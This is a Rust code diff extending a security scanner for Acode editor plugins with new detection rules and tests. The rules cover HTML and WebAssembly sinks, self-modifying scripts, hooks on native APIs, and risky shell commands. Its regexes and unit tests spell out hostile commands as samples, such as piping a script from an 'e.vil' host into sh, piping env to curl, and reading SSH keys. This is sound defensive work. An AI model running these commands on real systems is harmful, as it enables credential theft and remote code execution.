@@ -105,12 +105,16 @@ pub struct FileFacts {
     pub reads_sensitive_data: bool,
     pub listens_to_keys: bool,
     pub minified: bool,
+    /// WebAssembly modules inlined as base64 strings.
+    pub embedded_wasm: Vec<Vec<u8>>,
 }
 
 pub struct RuleContext<'a> {
     pub file: &'a str,
     pub source: &'a str,
     pub plugin_id: Option<&'a str>,
+    /// Installed path of the script Acode loads, when known.
+    pub entry: Option<&'a str>,
     line_starts: Vec<usize>,
     pub findings: Vec<Finding>,
     pub facts: FileFacts,
@@ -122,6 +126,7 @@ impl<'a> RuleContext<'a> {
             file,
             source,
             plugin_id,
+            entry: None,
             line_starts: line_starts(source),
             findings: Vec::new(),
             facts: FileFacts::default(),
@@ -205,6 +210,14 @@ pub struct Arg {
     pub is_function: bool,
     /// What the argument refers to, e.g. `acode` for `Object.assign(acode, …)`.
     pub path: Option<String>,
+    /// An object literal, e.g. fetch options.
+    pub is_object: bool,
+    /// Static keys of an object literal.
+    pub object_keys: Vec<String>,
+    /// URL of a `fetch(url)` call passed as this argument, when partly known.
+    pub fetch_url: Option<String>,
+    /// `method` of an options object literal, e.g. `fetch(url, { method: "POST" })`.
+    pub http_method: Option<String>,
 }
 
 impl Arg {
@@ -302,6 +315,35 @@ pub fn classify_call(ctx: &mut RuleContext<'_>, call: &Call<'_>) {
         return;
     }
 
+    if let Some(receiver) = path.strip_suffix(".setAttribute") {
+        classify_set_attribute(ctx, call, receiver);
+        return;
+    }
+    if path.ends_with(".insertAdjacentHTML") {
+        if let Some(html) = call.arg(1) {
+            classify_html_sink(
+                ctx,
+                call.span,
+                "insertAdjacentHTML",
+                html,
+                call.in_remote_callback,
+            );
+        }
+        return;
+    }
+    if path.ends_with(".createContextualFragment") {
+        if let Some(html) = call.arg(0) {
+            classify_html_sink(
+                ctx,
+                call.span,
+                "createContextualFragment",
+                html,
+                call.in_remote_callback,
+            );
+        }
+        return;
+    }
+
     match path {
         "eval" => classify_code_sink(ctx, call, "dynamic.eval", "eval"),
         "Function" => classify_code_sink(
@@ -344,6 +386,7 @@ pub fn classify_call(ctx: &mut RuleContext<'_>, call: &Call<'_>) {
                 call.arg_text(0).unwrap_or("fetch(…)"),
             );
             record_url(ctx, call.arg_text(0));
+            classify_acode_account(ctx, call);
         }
         "XMLHttpRequest" => ctx.add(
             "network.xhr",
@@ -381,6 +424,11 @@ pub fn classify_call(ctx: &mut RuleContext<'_>, call: &Call<'_>) {
             call.arg_text(0).unwrap_or("sendBeacon"),
         ),
         "importScripts" => classify_import(ctx, call.span, call.arg(0)),
+        "WebAssembly.instantiate"
+        | "WebAssembly.instantiateStreaming"
+        | "WebAssembly.compile"
+        | "WebAssembly.compileStreaming"
+        | "WebAssembly.Module" => classify_wasm_load(ctx, call),
         "Worker" | "SharedWorker" => {
             let source = call.arg_text(0).unwrap_or("");
             if is_remote_url(source) {
@@ -464,6 +512,27 @@ pub fn classify_call(ctx: &mut RuleContext<'_>, call: &Call<'_>) {
             "Direct Cordova file system access",
             call.arg_text(0).unwrap_or("resolveLocalFileSystemURL"),
         ),
+        "$module:settings.update" => {
+            if call
+                .arg(0)
+                .is_some_and(|arg| arg.object_keys.iter().any(|key| key == "pluginsDisabled"))
+            {
+                classify_tamper_target(
+                    ctx,
+                    call.span,
+                    "$module:settings.value.pluginsDisabled",
+                    "settings.update",
+                );
+            }
+        }
+        "$module:webview.create" => ctx.add(
+            "acode.webview",
+            Severity::Low,
+            Category::AcodeApi,
+            span,
+            "Opens an in-app WebView (a separate page that can message the plugin)",
+            "webview.create",
+        ),
         "acode.require" => classify_require(ctx, call),
         "acode.define" => classify_define(ctx, call),
         "acode.installPlugin" => ctx.push(
@@ -525,8 +594,17 @@ pub fn classify_call(ctx: &mut RuleContext<'_>, call: &Call<'_>) {
         | "Reflect.set"
         | "Reflect.defineProperty"
         | "Object.setPrototypeOf" => {
-            if let Some(target) = call.arg(0).and_then(|arg| arg.path.as_deref()) {
-                classify_tamper_target(ctx, call.span, target, path);
+            if let Some(object) = call.arg(0).and_then(|arg| arg.path.as_deref()) {
+                // defineProperty(obj, "name", …) and Reflect.set(obj, "name", …)
+                // patch `obj.name`, not `obj`.
+                let target = match (path, call.arg_value(1)) {
+                    (
+                        "Object.defineProperty" | "Reflect.set" | "Reflect.defineProperty",
+                        Some(property),
+                    ) => format!("{object}.{property}"),
+                    _ => object.to_string(),
+                };
+                classify_tamper_target(ctx, call.span, &target, path);
             }
         }
         "navigator.clipboard.readText"
@@ -574,6 +652,44 @@ fn classify_fallback(ctx: &mut RuleContext<'_>, call: &Call<'_>) {
     if !call.path.starts_with("$unknown.") {
         return;
     }
+    // WebView instances come back from an awaited `create`, so they are only
+    // recognised by method name in files that use the webview module.
+    if ctx
+        .facts
+        .required_modules
+        .iter()
+        .any(|name| name == "webview")
+    {
+        match method {
+            "loadURL" => {
+                let url = call.arg_text(0).unwrap_or_default();
+                if is_remote_url(url) {
+                    ctx.add(
+                        "acode.webview_remote_page",
+                        Severity::Medium,
+                        Category::AcodeApi,
+                        Some(call.span),
+                        "Loads a remote page in an Acode WebView",
+                        url,
+                    );
+                    record_url(ctx, Some(url));
+                }
+                return;
+            }
+            "evaluate" | "loadHTML" => {
+                ctx.add(
+                    "acode.webview_script",
+                    Severity::Low,
+                    Category::AcodeApi,
+                    Some(call.span),
+                    "Runs script or HTML inside an Acode WebView",
+                    method,
+                );
+                return;
+            }
+            _ => {}
+        }
+    }
     let (id, severity) = match method {
         "readFile" | "lsDir" => ("filesystem.read", Severity::Info),
         // Not moveTo: canvas contexts have one too.
@@ -593,6 +709,158 @@ fn classify_fallback(ctx: &mut RuleContext<'_>, call: &Call<'_>) {
         )
         .with_confidence(Confidence::Low),
     );
+}
+
+static INLINE_HANDLER: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"(?i)[\s"'/]on[a-z]+\s*=|javascript:"#).expect("valid handler pattern")
+});
+
+/// HTML written into the page. Scripts inside `createContextualFragment`
+/// output and `srcdoc` frames run; with `innerHTML` and friends only inline
+/// event handlers do, which is still enough to run code.
+pub fn classify_html_sink(
+    ctx: &mut RuleContext<'_>,
+    span: Span,
+    sink: &str,
+    html: &Arg,
+    in_remote_callback: bool,
+) {
+    let runs_scripts = matches!(sink, "createContextualFragment" | "srcdoc");
+    let remote = html.remote || (in_remote_callback && html.value.is_none());
+    let (id, severity, message) = if remote && runs_scripts {
+        (
+            "dynamic.remote_code",
+            Severity::Critical,
+            format!("Runs downloaded HTML, scripts included, through {sink}"),
+        )
+    } else if remote {
+        (
+            "dynamic.remote_html",
+            Severity::Medium,
+            format!("Inserts downloaded HTML with {sink}; inline event handlers in it run as code"),
+        )
+    } else if html.decoded && runs_scripts {
+        (
+            "dynamic.decoded_exec",
+            Severity::High,
+            format!("Runs decoded HTML, scripts included, through {sink}"),
+        )
+    } else if html.decoded {
+        (
+            "dynamic.decoded_html",
+            Severity::Medium,
+            format!("Inserts decoded HTML with {sink}"),
+        )
+    } else if runs_scripts && html.text().is_some_and(contains_script_tag) {
+        (
+            "dynamic.html_script",
+            Severity::Medium,
+            format!("Runs a <script> through {sink}"),
+        )
+    } else if html
+        .text()
+        .is_some_and(|text| INLINE_HANDLER.is_match(text))
+    {
+        (
+            "dynamic.inline_handler",
+            Severity::Low,
+            format!("HTML with inline event handlers or javascript: URLs through {sink}"),
+        )
+    } else {
+        return;
+    };
+    let evidence = html
+        .text()
+        .map(str::to_string)
+        .unwrap_or_else(|| ctx.snippet(span));
+    ctx.push(
+        ctx.finding(
+            id,
+            severity,
+            Category::DynamicCode,
+            Some(span),
+            message,
+            evidence,
+        )
+        .keyed(sink),
+    );
+}
+
+/// `el.setAttribute(name, value)`; `receiver` is `$element:<tag>` when the
+/// element came from `document.createElement`.
+fn classify_set_attribute(ctx: &mut RuleContext<'_>, call: &Call<'_>, receiver: &str) {
+    let Some(name) = call.arg_value(0).map(str::to_ascii_lowercase) else {
+        return;
+    };
+    let Some(value) = call.arg(1) else {
+        return;
+    };
+    let span = Some(call.span);
+    match name.as_str() {
+        "src" if receiver == "$element:script" => {
+            if value.text().is_some_and(is_remote_url) {
+                ctx.add(
+                    "dynamic.remote_script",
+                    Severity::High,
+                    Category::DynamicCode,
+                    span,
+                    "Loads a <script> from a remote URL (code reviewers never see)",
+                    value.text().unwrap_or_default(),
+                );
+            }
+        }
+        "srcdoc" => classify_html_sink(ctx, call.span, "srcdoc", value, call.in_remote_callback),
+        handler if handler.starts_with("on") && handler.len() > 2 => {
+            let base = if value.value.is_some() {
+                Severity::Low
+            } else {
+                Severity::Medium
+            };
+            let severity = sink_severity(value, call, base);
+            let id = match severity {
+                Severity::Critical => "dynamic.remote_code",
+                Severity::High => "dynamic.decoded_exec",
+                _ => "dynamic.inline_handler",
+            };
+            ctx.add(
+                id,
+                severity,
+                Category::DynamicCode,
+                span,
+                format!("Sets an `{handler}` attribute, which runs its value as code"),
+                value
+                    .text()
+                    .map(str::to_string)
+                    .unwrap_or_else(|| ctx.snippet(call.span)),
+            );
+        }
+        _ => {}
+    }
+}
+
+fn classify_wasm_load(ctx: &mut RuleContext<'_>, call: &Call<'_>) {
+    let method = call.path.trim_start_matches("WebAssembly.");
+    match call.arg(0).and_then(|arg| arg.fetch_url.as_deref()) {
+        Some(url) if is_remote_url(url) => {
+            ctx.add(
+                "wasm.remote_module",
+                Severity::High,
+                Category::Wasm,
+                Some(call.span),
+                "Compiles WebAssembly downloaded from a remote server, so the code was never reviewed",
+                url,
+            );
+            record_url(ctx, Some(url));
+        }
+        _ => ctx.add(
+            "wasm.instantiate",
+            Severity::Info,
+            Category::Wasm,
+            Some(call.span),
+            "Compiles or instantiates WebAssembly",
+            format!("WebAssembly.{method}"),
+        ),
+    }
 }
 
 fn classify_code_sink(ctx: &mut RuleContext<'_>, call: &Call<'_>, id: &str, name: &str) {
@@ -692,11 +960,9 @@ fn classify_executor(ctx: &mut RuleContext<'_>, call: &Call<'_>, method: &str) {
     match method {
         "execute" | "start" | "spawnStream" | "write" => {
             // spawnStream takes an argv array; the resolver joins it.
-            let command = if method == "write" {
-                call.arg_text(1)
-            } else {
-                call.arg_text(0)
-            };
+            let index = if method == "write" { 1 } else { 0 };
+            let command = call.arg_text(index);
+            classify_command_source(ctx, call, call.arg(index), "Executor");
             ctx.push(
                 ctx.finding(
                     "shell.exec",
@@ -737,11 +1003,55 @@ fn classify_executor(ctx: &mut RuleContext<'_>, call: &Call<'_>, method: &str) {
 }
 
 fn classify_terminal_module(ctx: &mut RuleContext<'_>, call: &Call<'_>, method: &str) {
-    if method == "write"
-        && let Some(data) = call.arg_text(1)
-    {
+    if method != "write" {
+        return;
+    }
+    classify_command_source(ctx, call, call.arg(1), "the terminal module");
+    if let Some(data) = call.arg_text(1) {
         classify_command(ctx, call.span, data);
     }
+}
+
+/// A command whose text came from the network or a decoder, graded like the
+/// same value reaching `eval`. Constant commands inside a fetch callback are
+/// not remote, so only commands with runtime parts count there.
+fn classify_command_source(
+    ctx: &mut RuleContext<'_>,
+    call: &Call<'_>,
+    command: Option<&Arg>,
+    via: &str,
+) {
+    let Some(command) = command else {
+        return;
+    };
+    let (id, severity, message) =
+        if command.remote || (call.in_remote_callback && command.value.is_none()) {
+            (
+                "shell.remote_command",
+                Severity::Critical,
+                format!("Runs a shell command downloaded at runtime through {via}"),
+            )
+        } else if command.decoded {
+            (
+                "shell.decoded_command",
+                Severity::High,
+                format!("Runs a decoded/encoded shell command through {via}"),
+            )
+        } else {
+            return;
+        };
+    let evidence = command
+        .text()
+        .map(str::to_string)
+        .unwrap_or_else(|| ctx.snippet(call.span));
+    ctx.add(
+        id,
+        severity,
+        Category::Shell,
+        Some(call.span),
+        message,
+        evidence,
+    );
 }
 
 fn classify_terminal_env(ctx: &mut RuleContext<'_>, call: &Call<'_>, method: &str) {
@@ -774,6 +1084,8 @@ struct CommandRule {
     severity: Severity,
     message: &'static str,
     pattern: Regex,
+    /// Matches across lines, so a shell script is checked as a whole too.
+    multiline: bool,
 }
 
 static COMMAND_RULES: LazyLock<Vec<CommandRule>> = LazyLock::new(|| {
@@ -782,8 +1094,45 @@ static COMMAND_RULES: LazyLock<Vec<CommandRule>> = LazyLock::new(|| {
         severity,
         message,
         pattern: Regex::new(&format!("(?i){pattern}")).expect("valid command pattern"),
+        multiline: pattern.starts_with("(?s)"),
     };
     vec![
+        rule(
+            "download_then_exec",
+            Severity::High,
+            "Downloads a file and makes it executable",
+            r"(?s)\b(curl|wget)\b[^\n]*\s(-o|-O|--output|--output-document)[=\s]*\S+.{0,600}?\bchmod\s+(\+x|[ugoa]+\+[rw]*x|[0-7]*[1357][0-7]{0,2}\b)",
+        ),
+        rule(
+            "untrusted_package_source",
+            Severity::Medium,
+            "Installs packages from an unverified source (plain-HTTP repository, URL, or git)",
+            r"--repository[=\s]+http://|--allow-untrusted|(--index-url|--extra-index-url|\s-i)[=\s]+http://|\b(pip3?|npm|pnpm|yarn)\s+(install|i|add)\b[^\n;&|]*\s(git\+\S+|https?://\S+\.(whl|tar\.gz|tgz|zip)\b)",
+        ),
+        rule(
+            "credential_access",
+            Severity::High,
+            "Touches SSH keys or stored credentials",
+            r"(~|\$HOME|\$\{HOME\}|/root|/home/[^/\s]+)/\.ssh/(id_|authorized_keys)|\.git-credentials|\.netrc\b|\.npmrc\b|\.pypirc\b|\.aws/credentials|\.config/gh/hosts\.yml",
+        ),
+        rule(
+            "file_upload",
+            Severity::High,
+            "Uploads a local file with curl",
+            r#"\bcurl\b[^\n]*(\s-T\s|--upload-file|\s(-d|--data|--data-binary|--data-raw)[=\s]*@|\s-F\s*['"]?[^=\s]+=@)"#,
+        ),
+        rule(
+            "pipe_to_network",
+            Severity::High,
+            "Pipes environment, history, or file contents to a network tool",
+            r"\b(env|printenv|history|cat\s+[^\n|;&]+)\s*\|\s*(curl|wget|nc|ncat|socat)\b",
+        ),
+        rule(
+            "scheduled_persistence",
+            Severity::Medium,
+            "Schedules commands to run later or at boot",
+            r"\bcrontab\b|/etc/(init\.d|rc\.local|crontabs|periodic)",
+        ),
         rule(
             "download_and_run",
             Severity::Critical,
@@ -836,7 +1185,16 @@ static COMMAND_RULES: LazyLock<Vec<CommandRule>> = LazyLock::new(|| {
 });
 
 fn classify_command(ctx: &mut RuleContext<'_>, span: Span, command: &str) {
-    for rule in COMMAND_RULES.iter() {
+    classify_command_with(ctx, span, command, |_| true);
+}
+
+fn classify_command_with(
+    ctx: &mut RuleContext<'_>,
+    span: Span,
+    command: &str,
+    include: impl Fn(&CommandRule) -> bool,
+) {
+    for rule in COMMAND_RULES.iter().filter(|rule| include(rule)) {
         if rule.pattern.is_match(command) {
             ctx.push(
                 ctx.finding(
@@ -854,6 +1212,47 @@ fn classify_command(ctx: &mut RuleContext<'_>, span: Span, command: &str) {
     for url in extract_urls(command) {
         ctx.facts.urls.push(url);
     }
+}
+
+/// `.sh` files and `#!` shell scripts shipped in the zip; plugins run them
+/// through Executor, so they get the same command checks as JS strings.
+pub fn is_shell_script(path: &str, bytes: &[u8]) -> bool {
+    matches!(
+        crate::archive::extension(path).as_str(),
+        "sh" | "bash" | "zsh" | "ash"
+    ) || bytes
+        .strip_prefix(b"#!")
+        .and_then(|rest| rest.split(|byte| *byte == b'\n').next())
+        .is_some_and(|shebang| {
+            let shebang = String::from_utf8_lossy(shebang);
+            ["sh", "bash", "zsh", "ash", "dash"]
+                .iter()
+                .any(|shell| shebang.split(['/', ' ']).any(|part| part.trim() == *shell))
+        })
+}
+
+pub fn scan_shell_script(ctx: &mut RuleContext<'_>) {
+    let source = ctx.source;
+    ctx.add(
+        "shell.script_file",
+        Severity::Low,
+        Category::Shell,
+        None,
+        "Ships a shell script (it can be run through Executor)",
+        format!("{} lines", source.lines().count()),
+    );
+    let mut start = 0;
+    for line in source.split_inclusive('\n') {
+        let end = start + line.len();
+        let text = line.trim_end();
+        if !text.trim_start().starts_with('#') && !text.trim().is_empty() {
+            classify_command_with(ctx, Span::new(start as u32, end as u32), text, |rule| {
+                !rule.multiline
+            });
+        }
+        start = end;
+    }
+    classify_command_with(ctx, Span::new(0, 0), source, |rule| rule.multiline);
 }
 
 fn classify_system(ctx: &mut RuleContext<'_>, call: &Call<'_>, method: &str) {
@@ -1109,6 +1508,9 @@ fn classify_fs_operation(ctx: &mut RuleContext<'_>, call: &Call<'_>, rest: &str)
         );
         return;
     }
+    if classify_self_modify(ctx, call, target, method) {
+        return;
+    }
     let (id, severity, message) = match method {
         "readFile" | "lsDir" => {
             ctx.facts.reads_sensitive_data = true;
@@ -1143,11 +1545,193 @@ fn classify_fs_operation(ctx: &mut RuleContext<'_>, call: &Call<'_>, rest: &str)
     );
 }
 
+/// Writing scripts where the plugin, or Acode, loads code from means the code
+/// that runs later was never part of a reviewed zip. Returns true when it
+/// reported something.
+fn classify_self_modify(
+    ctx: &mut RuleContext<'_>,
+    call: &Call<'_>,
+    target: &str,
+    method: &str,
+) -> bool {
+    let mut parts = target.split('|');
+    let zone = parts.next().unwrap_or("");
+    if !matches!(zone, "plugin_dir" | "own_dir" | "app_data") {
+        return false;
+    }
+    // createFile(name, data) and renameTo(name) carry the file name; writeFile
+    // writes to the path itself.
+    let (name_arg, data_arg) = match method {
+        "writeFile" => (None, call.arg(0)),
+        "createFile" => (call.arg_value(0), call.arg(1)),
+        "renameTo" => (call.arg_value(0), None),
+        _ => return false,
+    };
+    let Some(name) = parts.chain(name_arg).find(|name| is_loadable_name(name)) else {
+        return false;
+    };
+    let file = name.rsplit('/').next().unwrap_or(name).to_ascii_lowercase();
+    let entry = ctx
+        .entry
+        .map_or("main.js", |entry| entry.rsplit('/').next().unwrap_or(entry))
+        .to_ascii_lowercase();
+    let remote = data_arg
+        .is_some_and(|data| data.remote || (call.in_remote_callback && data.value.is_none()));
+    let loads_on_start = file == "plugin.json" || (zone != "app_data" && file == entry);
+    let (severity, message) = if remote {
+        (
+            Severity::Critical,
+            "Saves downloaded code as a script file, so what runs later was never reviewed",
+        )
+    } else if loads_on_start {
+        (
+            Severity::Critical,
+            "Rewrites its own entry script or plugin.json at runtime, replacing the reviewed code",
+        )
+    } else {
+        (
+            Severity::High,
+            "Writes script files where plugins load code from at runtime",
+        )
+    };
+    let confidence = if zone == "own_dir" {
+        // Found through a `baseUrl` name, not a constant Acode defines.
+        Confidence::Medium
+    } else {
+        Confidence::High
+    };
+    ctx.push(
+        ctx.finding(
+            "tampering.self_modify",
+            severity,
+            Category::Tampering,
+            Some(call.span),
+            message,
+            format!("fsOperation({zone}…{name}).{method}"),
+        )
+        .with_confidence(confidence)
+        .keyed(file),
+    );
+    true
+}
+
+/// File names Acode or a browser will run: scripts, pages, wasm, the manifest.
+fn is_loadable_name(name: &str) -> bool {
+    let lower = name.to_ascii_lowercase();
+    let file = lower.rsplit('/').next().unwrap_or(&lower);
+    file == "plugin.json"
+        || [".js", ".mjs", ".cjs", ".html", ".htm", ".wasm"]
+            .iter()
+            .any(|ext| file.ends_with(ext))
+}
+
+/// acode.app API paths that return the signed-in user's account data.
+const ACODE_ACCOUNT_READS: &[&str] =
+    &["/api/login", "/api/user", "/api/plugin/owned", "owned=true"];
+
+/// Acode's fetch polyfill adds `credentials: "include"` to every request whose
+/// URL contains `acode.app/api`, so a plugin's request is made as the
+/// signed-in user.
+fn classify_acode_account(ctx: &mut RuleContext<'_>, call: &Call<'_>) {
+    let Some(url) = call.arg_text(0) else {
+        return;
+    };
+    let lower = url.to_ascii_lowercase();
+    if !lower.contains("acode.app/api") {
+        return;
+    }
+    let method = match call.arg(1) {
+        None => Some("GET".to_string()),
+        Some(options) => match &options.http_method {
+            Some(method) => Some(method.to_ascii_uppercase()),
+            // An options literal without `method` is still a GET; anything
+            // else could say anything.
+            None => options.is_object.then(|| "GET".to_string()),
+        },
+    };
+    let span = Some(call.span);
+    match method.as_deref() {
+        Some("GET" | "HEAD") => {
+            if ACODE_ACCOUNT_READS.iter().any(|path| lower.contains(path)) {
+                ctx.facts.reads_sensitive_data = true;
+                ctx.push(
+                    ctx.finding(
+                        "network.acode_account_read",
+                        Severity::Medium,
+                        Category::Network,
+                        span,
+                        "Reads the signed-in user's acode.app account (Acode sends their session cookies)",
+                        url,
+                    )
+                    .keyed(account_path(&lower)),
+                );
+            }
+        }
+        Some(method) => ctx.push(
+            ctx.finding(
+                "network.acode_account_write",
+                Severity::High,
+                Category::Network,
+                span,
+                "Changes data on acode.app as the signed-in user (Acode sends their session cookies)",
+                format!("{method} {url}"),
+            )
+            .keyed(format!("{method} {}", account_path(&lower))),
+        ),
+        None => ctx.push(
+            ctx.finding(
+                "network.acode_account_write",
+                Severity::Medium,
+                Category::Network,
+                span,
+                "Calls acode.app's API as the signed-in user with a method decided at runtime",
+                url,
+            )
+            .with_confidence(Confidence::Low)
+            .keyed(format!("? {}", account_path(&lower))),
+        ),
+    }
+}
+
+/// `https://acode.app/api/plugin/…?x=1` -> `/api/plugin`, stable across ids.
+fn account_path(url: &str) -> String {
+    let path = url
+        .split_once("acode.app")
+        .map_or(url, |(_, rest)| rest)
+        .split(['?', '#'])
+        .next()
+        .unwrap_or_default();
+    path.split('/')
+        .take_while(|part| !part.contains('…'))
+        .take(3)
+        .collect::<Vec<_>>()
+        .join("/")
+}
+
 fn classify_cordova_exec(ctx: &mut RuleContext<'_>, call: &Call<'_>) {
     let service = call.arg_value(2);
     let action = call.arg_value(3).unwrap_or("?");
     let span = Some(call.span);
     match service {
+        Some("Authenticator") => ctx.push(
+            ctx.finding(
+                "native.account_bridge",
+                if action == "saveToken" {
+                    Severity::Critical
+                } else {
+                    Severity::High
+                },
+                Category::Native,
+                span,
+                if action == "saveToken" {
+                    "Plants an acode.app session token through Acode's account bridge"
+                } else {
+                    "Calls Acode's acode.app account bridge directly (log in / log out)"
+                },
+                format!("Authenticator.{action}"),
+            )
+            .keyed(action),
+        ),
         Some("Tee") => ctx.push(
             ctx.finding(
                 "native.plugin_context_bridge",
@@ -1302,6 +1886,57 @@ fn classify_lifecycle(ctx: &mut RuleContext<'_>, call: &Call<'_>) {
 }
 
 /// Assignment target or Object.defineProperty target that patches Acode.
+/// Globals installed by Acode's own Cordova plugins. Every plugin calls these,
+/// so a hook on them sees (or rewrites) the other plugins' calls.
+const NATIVE_GLOBALS: &[&str] = &[
+    "system",
+    "Executor",
+    "Terminal",
+    "sdcard",
+    "sftp",
+    "ftp",
+    "iap",
+    "CreateServer",
+];
+
+/// DOM and built-in methods that, once wrapped, see every event, inserted
+/// script, attribute, or function call in the app. Only security-relevant
+/// members: polyfills for things like `matches` or `append` are left alone,
+/// and so is `Function.prototype.toString`, which every core-js bundle
+/// replaces.
+const DOM_HOOKS: &[&str] = &[
+    "EventTarget.prototype.addEventListener",
+    "EventTarget.prototype.removeEventListener",
+    "EventTarget.prototype.dispatchEvent",
+    "Node.prototype.appendChild",
+    "Node.prototype.insertBefore",
+    "Node.prototype.replaceChild",
+    "Element.prototype.setAttribute",
+    "HTMLInputElement.prototype.value",
+    "HTMLTextAreaElement.prototype.value",
+    "HTMLScriptElement.prototype.src",
+    "Function.prototype.call",
+    "Function.prototype.apply",
+    "Function.prototype.bind",
+    "document.createElement",
+    "document.addEventListener",
+    "document.head.appendChild",
+    "document.head.append",
+    "document.body.appendChild",
+];
+
+/// Ad objects and ids Acode sets on `window` for its rewarded ads.
+const AD_GLOBALS: &[&str] = &["ad", "iad", "admob", "adRewardedUnitId"];
+
+fn is_or_under(target: &str, names: &[&str]) -> bool {
+    names.iter().any(|name| {
+        target == *name
+            || target
+                .strip_prefix(name)
+                .is_some_and(|rest| rest.starts_with('.'))
+    })
+}
+
 pub fn classify_tamper_target(ctx: &mut RuleContext<'_>, span: Span, target: &str, how: &str) {
     let (id, severity, message) = if target == "acode" || target.starts_with("acode.") {
         (
@@ -1323,6 +1958,30 @@ pub fn classify_tamper_target(ctx: &mut RuleContext<'_>, span: Span, target: &st
             "tampering.network_hook",
             Severity::High,
             "Hooks the app's network APIs (can see every request)",
+        )
+    } else if is_or_under(target, NATIVE_GLOBALS) {
+        (
+            "tampering.native_api",
+            Severity::High,
+            "Replaces or patches a native API other plugins use (can see or change their calls)",
+        )
+    } else if is_or_under(target, DOM_HOOKS) {
+        (
+            "tampering.dom_hook",
+            Severity::High,
+            "Hooks a DOM or built-in method used by Acode and every plugin (can intercept input, events, or scripts)",
+        )
+    } else if is_or_under(target, AD_GLOBALS) {
+        (
+            "tampering.ads",
+            Severity::High,
+            "Replaces Acode's ad objects or ad unit id (can redirect ad revenue)",
+        )
+    } else if is_or_under(target, &["$module:settings.value.pluginsDisabled"]) {
+        (
+            "tampering.plugin_settings",
+            Severity::High,
+            "Turns plugins on or off by editing Acode's settings",
         )
     } else if target.starts_with("editorManager.") && !target.contains(".activeFile.") {
         (
@@ -1392,6 +2051,20 @@ pub fn classify_reference(ctx: &mut RuleContext<'_>, name: &str, span: Span) {
 pub fn classify_string(ctx: &mut RuleContext<'_>, value: &str, span: Span) {
     if value.len() >= 8 && value.contains("://") {
         ctx.facts.urls.extend(extract_urls(value));
+    }
+    if let Some(module) = decode_wasm_payload(value) {
+        if ctx.facts.embedded_wasm.len() < MAX_EMBEDDED_WASM {
+            ctx.facts.embedded_wasm.push(module);
+        }
+        ctx.add(
+            "wasm.embedded_module",
+            Severity::Low,
+            Category::Wasm,
+            Some(span),
+            "WebAssembly module inlined as a base64 string (decoded and checked like a shipped one)",
+            format!("{} base64 characters", value.len()),
+        );
+        return;
     }
     if value.len() >= BASE64_PAYLOAD_MIN_LEN
         && let Some(decoded) = decode_js_payload(value)
@@ -1513,6 +2186,23 @@ fn looks_like_jsfuck(source: &str) -> bool {
         }
     }
     total > 0 && symbols * 100 >= total * 85
+}
+
+const MAX_EMBEDDED_WASM: usize = 16;
+
+/// `AGFzbQ…` or `data:application/wasm;base64,AGFzbQ…`.
+fn decode_wasm_payload(value: &str) -> Option<Vec<u8>> {
+    let data = match value.strip_prefix("data:") {
+        Some(rest) => rest.split_once(";base64,")?.1,
+        None => value,
+    };
+    if !data.starts_with(crate::wasm::BASE64_MAGIC) || data.len() < 16 {
+        return None;
+    }
+    let bytes = base64::engine::general_purpose::STANDARD
+        .decode(data.trim_end())
+        .ok()?;
+    bytes.starts_with(crate::wasm::MAGIC).then_some(bytes)
 }
 
 fn decode_js_payload(value: &str) -> Option<String> {
@@ -1846,10 +2536,68 @@ mod tests {
     }
 
     #[test]
+    fn flags_more_risky_shell_patterns() {
+        let has = |command: &str, rule: &str| {
+            command_ids(command).contains(&format!("shell.dangerous_command:{rule}"))
+        };
+        assert!(has(
+            "curl -L https://x.io/tool -o /usr/bin/tool && chmod +x /usr/bin/tool",
+            "download_then_exec"
+        ));
+        assert!(has(
+            "wget -O ~/bin/t https://x.io/t\nchmod 755 ~/bin/t",
+            "download_then_exec"
+        ));
+        assert!(has(
+            "apk add --allow-untrusted ./x.apk",
+            "untrusted_package_source"
+        ));
+        assert!(has(
+            "pip install git+https://github.com/x/y",
+            "untrusted_package_source"
+        ));
+        assert!(has("cat ~/.ssh/id_rsa", "credential_access"));
+        assert!(has("cp $HOME/.git-credentials /tmp/c", "credential_access"));
+        assert!(has(
+            "curl -F f=@/sdcard/notes.txt https://x.io/up",
+            "file_upload"
+        ));
+        assert!(has("env | curl -d @- https://x.io", "pipe_to_network"));
+        assert!(has(
+            "echo '* * * * * sh /x' | crontab -",
+            "scheduled_persistence"
+        ));
+    }
+
+    #[test]
+    fn checks_shipped_shell_scripts() {
+        let script = "#!/bin/sh\n# setup\ncurl -fsSL https://e.vil/i.sh | sh\nwget -O /tmp/x https://e.vil/x\nchmod +x /tmp/x\n";
+        assert!(is_shell_script("setup", script.as_bytes()));
+        assert!(is_shell_script("install.sh", b"apk add git"));
+        assert!(!is_shell_script("notes.txt", b"#!important"));
+        let mut ctx = RuleContext::new("setup", script, None);
+        scan_shell_script(&mut ctx);
+        let keys: Vec<_> = ctx.findings.iter().map(|f| f.key.as_str()).collect();
+        assert!(keys.contains(&"shell.dangerous_command:download_and_run"));
+        assert!(keys.contains(&"shell.dangerous_command:download_then_exec"));
+        let line = ctx
+            .findings
+            .iter()
+            .find(|f| f.key.ends_with(":download_and_run"))
+            .and_then(|f| f.span)
+            .map(|span| span.start_line);
+        assert_eq!(line, Some(3));
+        assert!(ctx.facts.urls.iter().any(|url| url.contains("e.vil")));
+    }
+
+    #[test]
     fn ignores_normal_shell_commands() {
         assert!(command_ids("apk add python3 && pip install black").is_empty());
         assert!(command_ids("rm -rf /tmp/build && mkdir -p ~/project").is_empty());
         assert!(command_ids("curl -L https://example.com/file.tar.gz -o file.tar.gz").is_empty());
+        assert!(command_ids("chmod +x ./gradlew && ./gradlew build").is_empty());
+        assert!(command_ids("pip install --index-url https://pypi.org/simple black").is_empty());
+        assert!(command_ids("curl -d '{\"a\":1}' https://api.example.com").is_empty());
     }
 
     #[test]
